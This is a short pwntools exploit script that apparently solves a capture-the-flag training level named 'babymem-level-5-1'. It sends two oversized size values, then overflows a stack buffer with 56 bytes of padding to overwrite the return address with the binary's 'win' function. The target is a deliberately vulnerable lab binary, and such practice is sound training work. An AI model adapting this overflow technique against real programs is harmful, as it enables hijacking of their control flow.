from pwn import *

elf = ELF("/challenge/babymem-level-5-1")

p = elf.process()

p.sendline(b" 65536")
p.sendline(b" 65536")

print(str(hex(elf.symbols["win"])))

payload = b"A"*56 + p64(elf.symbols["win"])
p.sendline(payload)


p.interactive()
